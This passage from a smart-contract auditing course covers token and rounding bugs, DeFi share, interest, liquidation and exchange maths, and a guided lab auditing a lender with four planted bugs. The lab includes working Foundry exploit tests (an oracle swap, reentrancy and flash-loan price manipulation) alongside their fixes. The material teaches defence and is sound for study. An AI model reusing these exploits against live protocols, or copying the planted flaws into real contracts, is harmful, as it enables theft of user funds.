    function safeTransfer(address token, address to, uint amt) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amt));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}
contract Payer { function pay(IERC20 t, address to, uint a) external { t.transfer(to, a); } }          // expects a bool
contract SafePayer { function pay(address t, address to, uint a) external { SafeTransfer.safeTransfer(t, to, a); } }

contract M1TokensTest is Test {
    function test_feeTokenBreaksNaiveAccounting() public {
        FeeToken t = new FeeToken(); NaiveDeposits d = new NaiveDeposits(IERC20(address(t)));
        t.mint(address(this), 100e18);
        d.deposit(100e18);
        assertEq(d.totalCredit(), 100e18);                     // the vault believes 100
        assertEq(t.balanceOf(address(d)), 99e18);              // it holds 99
    }
    function test_balanceDeltaFixes() public {
        FeeToken t = new FeeToken(); CarefulDeposits d = new CarefulDeposits(IERC20(address(t)));
        t.mint(address(this), 100e18);
        d.deposit(100e18);
        assertEq(d.totalCredit(), t.balanceOf(address(d)));
    }
    function test_noReturnTokenRevertsWithPlainCall() public {
        NoReturnToken t = new NoReturnToken(); Payer p = new Payer(); t.mint(address(p), 10e18);
        vm.expectRevert();
        p.pay(IERC20(address(t)), address(0xBEEF), 1e18);
    }
    function test_safeTransferHandlesIt() public {
        NoReturnToken t = new NoReturnToken(); SafePayer p = new SafePayer(); t.mint(address(p), 10e18);
        p.pay(address(t), address(0xBEEF), 1e18);
        assertEq(t.balanceOf(address(0xBEEF)), 1e18);
    }
}

What the tests show. The naive contract credits 100 but holds 99 (the last withdrawer cannot be paid). Measuring the balance change before and after the transfer fixes it. A plain t.transfer(...) through a bool interface reverts on a token that returns nothing; a low-level call that accepts empty return data works (OpenZeppelin's SafeERC20 does this).

How to spot it. For each token the system accepts, list its behaviour from the table. Does the code credit the requested amount or the received amount? Does it use SafeERC20? Does it read decimals()? Is there a list of allowed tokens, and who controls it?

Check yourself1. Why can a protocol that measures balance change still be fooled by a rebasing token? 2. Which line of CarefulDeposits is the fix?

Bug 6: Arithmetic and rounding

What it is. Whole-number maths gives a result different from the one the developer pictured.

Why it happens. Since Solidity 0.8, plain + - * revert on overflow, which removed a whole class of old bugs. Problems remain in: unchecked blocks (used to save gas), explicit casts (uint128(x) keeps only the low bits, silently), dividing before multiplying (loses precision), rounding the wrong way, mixing decimals, and intermediate products that overflow even when the final answer would fit.

File test/M1Math.t.sol:

pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract FeeMath {
    function feeDivideFirst(uint amount) external pure returns (uint) { return amount / 1000 * 3; }     // 0.3%
    function feeMultiplyFirst(uint amount) external pure returns (uint) { return amount * 3 / 1000; }
}
contract Casting {
    uint128 public stored;
    function recordUnsafe(uint amount) external { stored = uint128(amount); }          // silently keeps only the low 128 bits
    function recordSafe(uint amount) external { require(amount <= type(uint128).max, "too big"); stored = uint128(amount); }
}
contract Unchecked {
    function sub(uint a, uint b) external pure returns (uint) { unchecked { return a - b; } }
    function subChecked(uint a, uint b) external pure returns (uint) { return a - b; }
}
contract M1MathTest is Test {
    function test_divideFirstLosesTheFee() public {
        FeeMath f = new FeeMath();
        assertEq(f.feeDivideFirst(999), 0);                    // 999 units pay no fee at all
        assertEq(f.feeMultiplyFirst(999), 2);
        assertEq(f.feeDivideFirst(1999), 3);                   // 1999 pays 3 where 5 is due: always rounds down to a multiple of 1000
        assertEq(f.feeMultiplyFirst(1999), 5);
    }
    function test_downcastTruncates() public {
        Casting c = new Casting();
        c.recordUnsafe(2 ** 128 + 5);
        assertEq(c.stored(), 5);                               // 2^128 + 5 became 5
        vm.expectRevert("too big");
        c.recordSafe(2 ** 128 + 5);
    }
    function test_uncheckedWraps() public {
        Unchecked u = new Unchecked();
        assertEq(u.sub(0, 1), type(uint).max);
        vm.expectRevert();
        u.subChecked(0, 1);
    }
}

What the tests show. A 0.3% fee computed as amount / 1000 * 3 is 0 for 999 and 3 for 1,999 (where 5 is due): the fee is always rounded down to a multiple of 1000, so splitting trades into small pieces avoids it. uint128(2**128 + 5) becomes 5. unchecked { 0 - 1 } becomes the largest number.

The fix. Multiply first, then divide; use SafeCast or an explicit bound before narrowing; keep unchecked for places where you can prove no overflow; choose and document the rounding direction of every division (Module M2); normalise decimals at the boundary; use a full-precision mulDiv for products of large numbers.

How to spot it. Search for unchecked, uint128(, uint96( and /. For each division, write which party gets the remainder.

Check yourself1. A pool charges a fee of amount * 5 / 10000. For which amounts is the fee zero? 2. Why does 0.8 not protect you from casts?

More classics to recognise

These recur often enough that you should recognise them on sight. You will meet most of them inside the protocol labs.

BugWhat it isWhat to check
Denial of serviceA loop over users, or a push payment to an address that reverts, blocks everyoneUnbounded loops; payouts inside loops; pull instead of push
Front-running and sandwichingAn attacker orders their transactions around yoursSlippage limit and deadline on every trade; commit-reveal for auctions
Signature replayA valid signature is used twice, or on another chain or contractNonce, chain id, contract address (EIP-712 domain), expiry; reject malleable signatures
Proxy and storage collisionsAn upgrade writes to the wrong slot; an uninitialised implementation is taken overStorage layout across versions; initializer; disable initialisation on the implementation
Forced ETHselfdestruct or a block reward can send ETH to a contract that did not agreeNever rely on address(this).balance == x
Weak randomness and timeblock.timestamp, blockhash and similar can be nudgedUse a verifiable random function; tolerate seconds of drift
Unchecked low-level callscall returns a flag that is ignoredAlways check the returned bool

Review: quiz and summary

Name the bug for each, then open the answer.

1. function sweep(address to) external { token.transfer(to, token.balanceOf(address(this))); }Missing access control (Bug 1): anyone can send all the funds anywhere.
2. A function sends ETH, then sets the sender's balance to 0.Reentrancy (Bug 2): the balance is stale during the callback. Zero it first, and add a lock.
3. shares = assets * totalShares / token.balanceOf(address(this)), no zero checkShare inflation (Bug 3): a donation moves the price, small deposits round to zero shares.
4. A lender values collateral with the reserves of one exchange pool.Oracle manipulation (Bug 4): a flash loan moves the price inside one transaction.
5. credit[msg.sender] += amount after transferFrom(msg.sender, this, amount)Token surprise (Bug 5): fee-on-transfer tokens deliver less than amount. Credit the balance change.
6. fee = amount / 10000 * 25Arithmetic (Bug 6): division before multiplication; amounts below 10,000 pay nothing.
7. require(tx.origin == owner)Access control (Bug 1): use msg.sender. A malicious contract can borrow the owner's origin.
8. A nonReentrant lock on withdraw only, while transferTo reads the same balance.Cross-function reentrancy (Bug 2): the lock must cover every function that reads or writes the shared state.
BugRoot cause in one lineTypical fixReturns in
1 Access controlNo or wrong caller checkRole check on every state-changing functionEvery lab
2 ReentrancyState updated after an external callEffects before interactions; locksLabs 12, 13, 22, 26
3 Share inflationShare price readable from a balanceTracked assets; virtual sharesLabs 4, 5, 9, 17, 22, 23
4 OraclePrice movable in one transactionRobust feed; capsLabs 2, 3, 7, 8, 10, 15, 16
5 TokensAssumed standard behaviourMeasure balance change; safe transfersLabs 9, 13, 17, 22
6 ArithmeticWrong rounding, casts, uncheckedMultiply first; choose rounding; safe castsLabs 2, 4, 10, 13
Before you move onYou should be able to (a) write the exploit test for any of bugs 1 to 6 without looking, (b) say which of the six a code snippet contains, and (c) explain why each fix works. Then continue to M2.

M2. DeFi maths, step by step

In plain wordsDeFi runs on a handful of simple formulas for shares, interest, health and trading. Because the blockchain has only whole numbers, every formula also has a rounding rule that decides who keeps the leftover. Doing the maths by hand first lets you predict what code should output, which is how you notice code that does something else.

Key terms: shares, index, health factor, price impact, rounding direction. See the glossary at the end.

How to use this module. Work each example on paper before you look at the answer, then check it with the calculator on the same tab. Every number below was recomputed by a script. Plan about two hours. Each tab ends with a question for yourself.

Whole numbers, decimals and rounding

The rule of the machine. The blockchain has no fractions. 7 / 2 is 3, and the remainder (1) is thrown away. Every division in a contract therefore picks a winner: the leftover stays with the contract or goes to the user. An auditor's first question about any division is who gets the remainder, and can they exploit it?

Scaling. To represent 1.5 you store 1,500,000,000,000,000,000 (1.5 × 1018) and remember the scale. Common scales:

NameScaleUsed for
Token decimals6 (USDC), 8 (WBTC), 18 (most)Token amounts
WAD1018Prices, ratios, share prices
RAY1027Interest indexes (Aave)
Basis points104Percentages: 7,500 means 75%

Multiply, then divide, in one step. To compute a × b / c exactly down, use a * b / c; to round up use (a * b + c - 1) / c. Libraries call these mulDiv and mulDivUp. Dividing first (a / c * b) throws away precision before it is multiplied back.

ComputationRound which way?Why (the pool must not lose)
Shares minted for a depositDownDepositor gets slightly less, never more
Assets paid for shares redeemedDownUser gets slightly less
Shares burned for a given withdrawal of assetsUpUser pays slightly more
Assets charged for a given mint of sharesUpUser pays slightly more
Debt owedUpBorrower owes slightly more
Collateral valueDownBorrower is credited slightly less
Fees chargedUp (or documented)Protocol is not short-changed
Try it1. Compute mulDivUp(7, 3, 2) and mulDiv(7, 3, 2). 2. A 0.3% fee on 999 units: 999 * 3 / 1000 versus 999 / 1000 * 3. 3. Two numbers of 1027 scale are multiplied: how big is the product, and does it fit in 256 bits (about 1.16 × 1077)?
Answers1. 21/2 = 10.5: up gives 11, down gives 10. 2. 2 versus 0. 3. 1054: yes, it fits; but three such factors (1081) would not, which is why long chains of scaled multiplications need mulDiv.

Shares from first principles

The idea. A pool holds assets. Instead of recording each user's amount (which would need an update per user whenever interest arrives), it records shares. A user's claim is their fraction of the total shares times the total assets. When the pool earns, totalAssets grows and every share becomes worth more; no user record changes.

price per share      = totalAssets / totalShares
shares for a deposit = deposit × totalShares / totalAssets        (round down)
assets for shares    = shares × totalAssets / totalShares        (round down)
Invariant: the sum of everyone's share value never exceeds totalAssets

A ledger you can follow. The pool starts empty. First deposit: shares equal assets.

EventtotalAssetstotalSharesCalculation
Alice deposits 1,0001,0001,000First deposit: 1,000 shares
Bob deposits 5001,5001,500500 × 1,000 / 1,000 = 500 shares
Interest +150 (no new shares)1,6501,500Price per share is now 1.10
Carol deposits 3301,9801,800330 × 1,500 / 1,650 = 300 shares
Alice redeems 500 shares1,4301,300500 × 1,980 / 1,800 = 550 assets

Alice put in 1,000 and holds 500 shares worth 550 plus 500 shares still in the pool: she has earned from the interest even though no record of hers changed.

The rounding effect. A deposit of 7 at price 1.10 buys 7 × 1,500 / 1,650 = 6.36 shares; the contract gives 6. The missing 0.36 shares stay with the pool and make every other share very slightly more valuable. This is correct and intended. It becomes a bug only if the rounding goes the other way, or if a tiny share count lets rounding swallow a whole deposit (Bug 3).

ERC-4626 functionYou specifyYou getRounds
depositassets insharesDown
mintshares wantedassets chargedUp
withdrawassets wantedshares burnedUp
redeemshares burnedassets outDown
Try itA pool has 5,000 assets and 4,000 shares. How many shares does a deposit of 250 mint? What is it worth immediately afterwards?
Answer250 × 4,000 / 5,000 = 200 shares. Afterwards assets 5,250, shares 4,200: 200 × 5,250 / 4,200 = 250. A deposit that divides exactly loses nothing.

Interest indexes

The problem. A lender has thousands of borrowers, each with growing debt. Updating each record every second is impossible.

The idea. Keep one global number, the index, that grows with the interest rate. Store each borrower's debt as a scaled amount that never changes unless they act:

scaled = amount borrowed / index at that moment
debt now = scaled × index now

Worked example. The index starts at 1.00. Alice borrows 1,000: scaled 1,000. The index grows 5% to 1.05. Bob borrows 500: scaled 500 / 1.05 = 476.19. The index grows another 5% to 1.1025.

BorrowerScaledDebt at index 1.1025Check
Alice1,0001,102.501,000 × 1.05 × 1.05
Bob476.19525.00500 × 1.05 (only the second 5%)

Simple versus compound. At 10% a year, a loan of 1,000 owes 1,100 after a year with simple interest, about 1,105.17 with continuous compounding. Protocols update the index each time someone interacts, using the rate for the elapsed seconds, so interest compounds at the frequency of activity. The difference between the formula in the code and the idealised formula is small, but you should know which one the code uses, and that the index must be brought up to date before any balance is read (Labs 7 and 16).

Try itThe index goes from 1.00 to 1.02 and then to 1.0608 (another 4%). A user borrowed 1,000 at 1.02. What do they owe?
AnswerScaled = 1,000 / 1.02 = 980.39. Debt = 980.39 × 1.0608 = 1,040.00 (exactly the 4% since they borrowed).

Health factor, liquidation and bad debt

Definitions. A borrower posts collateral and borrows against it. The liquidation threshold (LT) is the fraction of collateral value that counts toward safety. The health factor is:

health factor = (collateral value × LT) / debt         below 1 means anyone may liquidate

Worked example. 10 ETH at 2,000 = 20,000. LT 82.5%. Debt 16,000. HF = 20,000 × 0.825 / 16,000 = 1.031.

  • Liquidation starts when HF = 1: collateral value = 16,000 / 0.825 = 19,394, so ETH at 1,939.39 (a fall of only 3.0%).
  • A liquidator repays debt and receives collateral worth the repaid amount plus a bonus (say 5%). That is their profit and the incentive to act.
  • Last price at which a full liquidation works: the liquidator needs collateral worth debt × 1.05 = 16,800, so ETH at 1,680.
  • Below that, the collateral cannot pay for the debt and the bonus. At ETH 1,500 the collateral is 15,000; the liquidator can repay at most 15,000 / 1.05 = 14,285.71, leaving 1,714.29 of bad debt that depositors absorb.
ETH priceCollateralHFWhat happens
2,00020,0001.031Healthy
1,93919,3900.9997Liquidation begins
1,68016,8000.866Last full liquidation (no loss)
1,50015,0000.773Bad debt 1,714.29

Why this matters to an auditor. The gap between the liquidation price and the bad-debt price (here 1,939 to 1,680, a 13% drop) is how much time the system has to liquidate. It shrinks if the threshold is high, the bonus is large, the price feed lags, or liquidations are slow (gas spikes, reverts). Every protocol you audit has this number; compute it.

Try it5 ETH at 3,000, LT 80%, debt 9,000, bonus 8%. HF? Price where liquidation starts? Price below which bad debt appears?
AnswerCollateral 15,000. HF = 15,000 × 0.8 / 9,000 = 1.333. Liquidation starts at 9,000 / (0.8 × 5) = 2,250. Bad debt below 9,000 × 1.08 / 5 = 1,944.

Constant-product exchange maths

The rule. A pool holds x of token A and y of token B. Trades must keep the product x × y = k unchanged (before fees). The spot price of A in B is y / x.

Derivation. Sell dx of A. New A reserve is x + dx. To keep k, the new B reserve is k / (x + dx). What leaves the pool is:

out = y - k/(x + dx) = y × dx / (x + dx)
with a fee f taken from the input:   out = y × dx(1-f) / (x + dx(1-f))

Worked example. Pool: 100 ETH and 200,000 USD (spot 2,000, k = 20,000,000). Sell 10 ETH with a 0.3% fee: effective input 9.97. out = 200,000 × 9.97 / 109.97 = 18,132.22 USD. Average price 1,813.22 against spot 2,000: 9.34% worse. New reserves: 110 ETH and 181,867.78 USD; new spot 1,653.34. The product is now 20,005,456 (higher than 20,000,000): the fee stays in the pool and raises k. That growth is what pays liquidity providers.

Trade size (share of ETH reserve)SoldUSD received (0.3% fee)Average priceWorse than spot by
1%1 ETH1,974.32 USD1,974.321.28%
5%5 ETH9,496.59 USD1,899.325.03%
10%10 ETH18,132.22 USD1,813.229.34%
25%25 ETH39,903.94 USD1,596.1620.19%
50%50 ETH66,533.20 USD1,330.6633.47%

Price impact grows roughly in proportion to trade size relative to the pool. That is why a pool that is small compared with a flash loan is a bad price source (Bug 4).

Practice set

Eight problems. Work each, then open the answer. Answers were checked with a script.

1. A pool has 2,400 assets and 1,200 shares. How many shares does a deposit of 250 mint?250 × 1,200 / 2,400 = 125.
2. The index is 1.02 when you borrow 1,000 and 1.06 later. What do you owe?1,000 × 1.06 / 1.02 = 1,039.22.
3. Collateral 40,000, LT 80%, debt 26,000. Health factor?40,000 × 0.8 / 26,000 = 1.231.
4. Pool 1,000 X and 5,000 Y. Sell 30 X with a 0.3% fee. How much Y?5,000 × 29.91 / (1,000 + 29.91) = 145.21.
5. What is mulDivUp(7, 3, 2)?11 (21 / 2 = 10.5 rounded up).
6. Fee 0.3% computed as amount * 3 / 1000. Fee on 999?2 (2.997 rounded down). Dividing first would give 0.
7. Why must a 'withdraw 100 assets' call burn shares rounded up?If it rounded down, a user could withdraw tiny amounts repeatedly and each time burn slightly too few shares, draining value from other holders.
8. A lender has LT 90% and a liquidation bonus of 10%. Is there a window in which liquidation works without bad debt?Liquidation starts when debt / collateral = 0.9 (HF 1). Bad debt starts when debt / collateral exceeds 1 / 1.10 = 0.909. The window is only from 90% to 90.9%: tiny. A bonus of 10% with a threshold of 90% leaves almost no safety margin. Such a configuration is a finding.
Two Foundry exercises1. Write a test for ERC-4626-style maths: deposit 7 into a pool with 1,650 assets and 1,500 shares; assert the minted amount is 6 and that redeeming those shares returns at most 7. 2. Write a fuzz test (function testFuzz_roundTrip(uint96 a)) asserting that deposit followed by redeem never returns more than was deposited; run it with forge test --fuzz-runs 10000 and then break the rounding direction to see it fail.

Lab 1. Audit a mini lender (guided)

In plain wordsA small lending pool with four planted bugs: it is your first full audit. You will read the code in four passes, write down what must always be true, find the bugs, prove each with a test that works, apply a fix, prove the fix, and write the findings in the format real audit reports use.

Key terms: finding, severity, proof of concept, invariant. See the glossary at the end.

The mission. Audit MiniLend. Users deposit ETH as collateral and borrow USD against it, up to 75% of the collateral's value at the oracle price. The contract has four bugs: one of each of access control, ordering of checks, reentrancy, and price manipulation (Bugs 1, 2, 4 of M1 and a close cousin). Plan three hours.

Rules. (1) Read the code and write your own list of problems before you open the hints. (2) For each suspected bug, write a test that exploits it. (3) Fix it, and show your exploit now fails. (4) Write a finding. The harness in tab 4 contains reference exploit tests; you may use it to check your work after you have tried.

The target

In plain words. MiniLend holds USD that it lends out. A user calls depositETH to post collateral. borrow sends USD to the user and records the debt. withdrawETH returns collateral if the account stays healthy. A price oracle tells the contract how many USD one ETH is worth. USD has 18 decimals here to keep the arithmetic simple.

// ------------------------------ the contract under audit ------------------------------
contract MiniLend {
    MockUSD public usd; IOracle public oracle;
    mapping(address => uint) public collateral;                // wei of ETH
    mapping(address => uint) public debt;                      // USD
    constructor(MockUSD u, IOracle o) { usd = u; oracle = o; }

    function setOracle(address o) external virtual { oracle = IOracle(o); }
    function depositETH() external payable { collateral[msg.sender] += msg.value; }

    function _maxDebt(uint coll) internal view returns (uint) { return coll * oracle.price() / 1e18 * 75 / 100; }
    function healthy(address u) public view returns (bool) { return debt[u] <= _maxDebt(collateral[u]); }

    function borrow(uint amt) external virtual {
        require(healthy(msg.sender), "unhealthy");
        debt[msg.sender] += amt;
        require(usd.transfer(msg.sender, amt));
    }
    function withdrawETH(uint amt) external virtual {
        require(collateral[msg.sender] >= amt, "no collateral");
        require(debt[msg.sender] <= _maxDebt(collateral[msg.sender] - amt), "would be unhealthy");
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok);
        collateral[msg.sender] -= amt;
    }
}

Read it first (four passes)

Do this on paper before anything else. Here is the worked answer for the first three passes so you can compare with your own.

PassQuestionAnswer for MiniLend
1. MapEntry points and where money sitsFive external functions: setOracle, depositETH, borrow, withdrawETH, plus the getter healthy. ETH sits in the contract (collateral). USD sits in the contract (to lend).
2. Money flowIn, out, state changeddepositETH: ETH in, collateral up. borrow: USD out, debt up. withdrawETH: ETH out, collateral down.
3. TrustWhat does it believe, and who controls that?The caller (any address). The oracle price: who sets it, and can it be moved? The USD token: assumed well behaved.

Pass 4: invariants. Write the statements that must always hold:

  1. After any action, every account has debt ≤ 75% of collateral value at the honest price.
  2. Only a trusted party can change which oracle is used.
  3. The price cannot be moved by one transaction.
  4. Whenever the contract sends ETH or USD, its records are already updated (so nobody can act on stale records).

Each bug is a way to break one of these. Now look for it.

Hints (three levels)

Open one level at a time, and only after trying.

Level 1: where to lookLook at four things: (1) who may call setOracle; (2) the order of the require and the debt += line in borrow; (3) what withdrawETH does between sending ETH and updating collateral; (4) where the oracle gets its price (the harness uses a pool in one test).
Level 2: which function, which invariant(1) setOracle breaks invariant 2. (2) borrow checks health before adding the new debt, so the check ignores the amount being borrowed. (3) withdrawETH sends ETH before updating records: during the callback, borrow still sees the old collateral. (4) A price read from pool reserves breaks invariant 3.
Level 3: bug class(1) Missing access control (M1 Bug 1). (2) Check before effect: the check uses state that does not include the action. (3) Cross-function reentrancy (M1 Bug 2): note that re-entering withdrawETH itself does not work on 0.8, because the nested subtraction underflows; re-entering borrow does. (4) Oracle manipulation (M1 Bug 4).

Prove it: the test harness

Run it
forge test --match-contract Lab1Test -vv
Put the file below in test/Lab1.t.sol. The four test_A to test_D tests are the exploits (they pass against the vulnerable code, which is the point). The four _fixed tests run the same attack against a patched version and expect it to fail. All eight pass as shown; I ran them.
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract MockUSD {                                             // 18 decimals to keep the lab simple
    mapping(address => uint) public balanceOf;
    function mint(address to, uint a) external { balanceOf[to] += a; }
    function transfer(address to, uint a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
}
interface IOracle { function price() external view returns (uint); }              // USD per 1 ETH, 1e18 scale
contract FixedOracle is IOracle {
    uint public p; constructor(uint _p) { p = _p; }
    function price() external view returns (uint) { return p; }
}
contract ToyPool {                                             // 1,000 ETH and 2,000,000 USD
    uint public rE = 1000e18; uint public rU = 2_000_000e18;
    function price() public view returns (uint) { return rU * 1e18 / rE; }
    function buyE(uint uIn) external returns (uint eOut) { eOut = rE * uIn / (rU + uIn); rU += uIn; rE -= eOut; }
    function sellE(uint eIn) external returns (uint uOut) { uOut = rU * eIn / (rE + eIn); rE += eIn; rU -= uOut; }
}
contract SpotOracle is IOracle {
    ToyPool pool; constructor(ToyPool p) { pool = p; }
    function price() external view returns (uint) { return pool.price(); }
}

// ------------------------------ the contract under audit ------------------------------
contract MiniLend {
    MockUSD public usd; IOracle public oracle;
    mapping(address => uint) public collateral;                // wei of ETH
    mapping(address => uint) public debt;                      // USD
    constructor(MockUSD u, IOracle o) { usd = u; oracle = o; }

    function setOracle(address o) external virtual { oracle = IOracle(o); }
    function depositETH() external payable { collateral[msg.sender] += msg.value; }

    function _maxDebt(uint coll) internal view returns (uint) { return coll * oracle.price() / 1e18 * 75 / 100; }
    function healthy(address u) public view returns (bool) { return debt[u] <= _maxDebt(collateral[u]); }

    function borrow(uint amt) external virtual {
        require(healthy(msg.sender), "unhealthy");
        debt[msg.sender] += amt;
        require(usd.transfer(msg.sender, amt));
    }
    function withdrawETH(uint amt) external virtual {
        require(collateral[msg.sender] >= amt, "no collateral");
        require(debt[msg.sender] <= _maxDebt(collateral[msg.sender] - amt), "would be unhealthy");
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok);
        collateral[msg.sender] -= amt;
    }
}
// ------------------------------ patched versions, one fix per layer ------------------------------
contract FixA is MiniLend {                                    // fix 1: only the owner may change the oracle
    address public owner;
    constructor(MockUSD u, IOracle o) MiniLend(u, o) { owner = msg.sender; }
    function setOracle(address o) external virtual override { require(msg.sender == owner, "not owner"); oracle = IOracle(o); }
}
contract FixAB is FixA {                                       // fix 2: add the debt first, then check
    constructor(MockUSD u, IOracle o) FixA(u, o) {}
    function borrow(uint amt) external virtual override {
        debt[msg.sender] += amt;
        require(healthy(msg.sender), "unhealthy");
        require(usd.transfer(msg.sender, amt));
    }
}
contract FixABC is FixAB {                                     // fix 3: update state before sending ETH
    constructor(MockUSD u, IOracle o) FixAB(u, o) {}
    function withdrawETH(uint amt) external virtual override {
        require(collateral[msg.sender] >= amt, "no collateral");
        collateral[msg.sender] -= amt;
        require(debt[msg.sender] <= _maxDebt(collateral[msg.sender]), "would be unhealthy");
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok);
    }
}
// fix 4 is a configuration change: give the lender a price that a single transaction cannot move

contract ReentrantBorrower {
    MiniLend l; bool done;
    constructor(MiniLend _l) { l = _l; }
    function attack() external payable { l.depositETH{value: 10 ether}(); l.withdrawETH(10 ether); }
    receive() external payable { if (!done) { done = true; l.borrow(15_000e18); } }
}

contract Lab1Test is Test {
    MockUSD usd; address attacker = address(0xBAD);
    function setUp() public { usd = new MockUSD(); }
    function _fund(MiniLend l) internal { usd.mint(address(l), 1_000_000e18); }

    function test_A_anyoneCanReplaceTheOracle() public {
        MiniLend l = new MiniLend(usd, new FixedOracle(2000e18)); _fund(l);
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        l.depositETH{value: 0.001 ether}();
        l.setOracle(address(new FixedOracle(1e30)));           // price of ETH: absurdly high
        l.borrow(1_000_000e18);
        vm.stopPrank();
        assertEq(usd.balanceOf(attacker), 1_000_000e18);
    }
    function test_B_borrowWithNoCollateral() public {
        MiniLend l = new MiniLend(usd, new FixedOracle(2000e18)); _fund(l);
        vm.prank(attacker); l.borrow(1_000_000e18);
        assertEq(usd.balanceOf(attacker), 1_000_000e18);
    }
    function test_C_borrowDuringWithdrawCallback() public {
        FixAB l = new FixAB(usd, new FixedOracle(2000e18)); _fund(l);
        ReentrantBorrower a = new ReentrantBorrower(l);
        vm.deal(address(a), 10 ether);
        a.attack();
        assertEq(address(a).balance, 10 ether);                // got the ETH back
        assertEq(usd.balanceOf(address(a)), 15_000e18);        // and kept the loan
        assertEq(l.collateral(address(a)), 0);                 // with nothing backing it
        assertEq(l.debt(address(a)), 15_000e18);
    }
    function test_D_flashLoanedPrice() public {
        ToyPool pool = new ToyPool();
        FixABC l = new FixABC(usd, new SpotOracle(pool)); _fund(l);
        vm.deal(attacker, 10 ether); vm.startPrank(attacker);
        uint e = pool.buyE(2_000_000e18);                      // borrow 2M USD for a moment and buy ETH: price 2,000 -> 8,000
        l.depositETH{value: 10 ether}();
        l.borrow(60_000e18);                                   // allowed: 10 ETH x 8,000 x 75%
        pool.sellE(e);                                         // price back to 2,000, flash loan repaid
        vm.stopPrank();
        assertEq(l.debt(attacker), 60_000e18);
        assertFalse(l.healthy(attacker));                      // at the honest price the loan is far too large
    }
    // ---- the patched versions resist the same attacks ----
    function test_A_fixed() public {
        FixA l = new FixA(usd, new FixedOracle(2000e18)); _fund(l);
        address fake = address(new FixedOracle(1e30));            // create it first: cheatcodes apply to the very next call
        vm.prank(attacker); vm.expectRevert("not owner"); l.setOracle(fake);
    }
    function test_B_fixed() public {
        FixAB l = new FixAB(usd, new FixedOracle(2000e18)); _fund(l);
        vm.prank(attacker); vm.expectRevert("unhealthy"); l.borrow(1_000_000e18);
    }
    function test_C_fixed() public {
        FixABC l = new FixABC(usd, new FixedOracle(2000e18)); _fund(l);
        ReentrantBorrower a = new ReentrantBorrower(l); vm.deal(address(a), 10 ether);
        vm.expectRevert(); a.attack();                         // the nested borrow sees zero collateral
    }
    function test_D_fixed() public {
        FixABC l = new FixABC(usd, new FixedOracle(2000e18)); _fund(l);   // a price one transaction cannot move
        vm.deal(attacker, 10 ether); vm.startPrank(attacker);
        l.depositETH{value: 10 ether}();
        vm.expectRevert("unhealthy"); l.borrow(60_000e18);
        vm.stopPrank();
    }
}

How the harness is built. MiniLend is the vulnerable contract. FixA, FixAB and FixABC each inherit the previous one and add one fix, so you can see each patch as a small diff. The fourth fix is a configuration change (a price that one transaction cannot move). Test C needs bugs A and B patched, otherwise B would let the attacker borrow anyway and hide C; test D needs A, B and C patched for the same reason. When you audit a real system, fix the shallow bugs first in your head, so deeper ones are not shadowed.

Solutions

Open only after you have written your own findings.

Bug A: anyone can replace the oracle (Critical)

Root cause. setOracle has no caller check. Steps. Deposit a tiny collateral; point the contract at an oracle that reports an enormous ETH price; borrow all the USD. Impact. The entire USD balance. Fix. Store an owner (ideally a multisig) and check it; consider a timelock. Proof. test_A_anyoneCanReplaceTheOracle and test_A_fixed.

contract FixA is MiniLend {                                    // fix 1: only the owner may change the oracle
    address public owner;
    constructor(MockUSD u, IOracle o) MiniLend(u, o) { owner = msg.sender; }
    function setOracle(address o) external virtual override { require(msg.sender == owner, "not owner"); oracle = IOracle(o); }
}
Bug B: the health check ignores the new debt (Critical)

Root cause. borrow calls healthy before debt += amt. An account with no collateral and no debt is healthy (0 ≤ 0), so it may borrow any amount. Impact. The entire USD balance, with no collateral. Fix. Add the debt first, then require the account to be healthy (and revert if not). Proof. test_B_borrowWithNoCollateral and test_B_fixed.

contract FixAB is FixA {                                       // fix 2: add the debt first, then check
    constructor(MockUSD u, IOracle o) FixA(u, o) {}
    function borrow(uint amt) external virtual override {
        debt[msg.sender] += amt;
        require(healthy(msg.sender), "unhealthy");
        require(usd.transfer(msg.sender, amt));
    }
}
Bug C: borrow during the withdraw callback (High)

Root cause. withdrawETH sends ETH before it lowers collateral. The check before the send is correct, but the state it checks is changed only afterwards. Steps. Deposit 10 ETH. Call withdrawETH(10 ether). In receive(), call borrow(15,000): borrow still sees 10 ETH of collateral and allows it. When the callback returns, the collateral drops to 0 and the debt stays. Impact. The attacker keeps the ETH and the loan: bad debt. Fix. Update collateral first, then check, then send (checks, effects, interactions). Proof. test_C_borrowDuringWithdrawCallback and test_C_fixed.

Why not re-enter withdrawETH itself? The nested call would subtract again on unwinding and underflow, so on Solidity 0.8 it simply reverts. A good auditor tests the idea instead of assuming it works.

contract FixABC is FixAB {                                     // fix 3: update state before sending ETH
    constructor(MockUSD u, IOracle o) FixAB(u, o) {}
    function withdrawETH(uint amt) external virtual override {
        require(collateral[msg.sender] >= amt, "no collateral");
        collateral[msg.sender] -= amt;
        require(debt[msg.sender] <= _maxDebt(collateral[msg.sender]), "would be unhealthy");
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok);
    }
}
Bug D: a price one transaction can move (Critical when the oracle reads a pool)

Root cause. The oracle reads the current reserves of an exchange pool. Steps. Flash-borrow 2,000,000 USD, buy ETH (price 2,000 to 8,000), deposit 10 ETH, borrow 60,000 USD, sell the ETH back, repay. Impact. 60,000 borrowed against collateral worth 20,000: 45,000 over the honest limit of 15,000. Fix. Use an external feed or a long TWAP, with staleness and bounds checks; add per-asset borrow caps. Proof. test_D_flashLoanedPrice and test_D_fixed.

Other issues a thorough auditor also notesThere is no repay and no liquidate (debt can never be cleared and bad debt can never be resolved); no interest; depositETH and borrow have no caps; the contract holds no USD unless someone sends it; there is no pause switch; the USD token is assumed to return true and not to charge fees (M1 Bug 5); there are no events, which makes monitoring hard. These are not part of the four planted bugs, but listing them shows you read the whole contract.

Write the report

A finding must let a stranger understand, reproduce and fix the problem in two minutes. Use this format, filled in here for Bug B:

[C-01] borrow() checks health before recording the new debt
Severity:    Critical   (impact: high, likelihood: high)
Impact:      Any address can borrow the lender's entire USD balance with no collateral.
Root cause:  MiniLend.borrow() calls healthy(msg.sender) before debt[msg.sender] += amt,
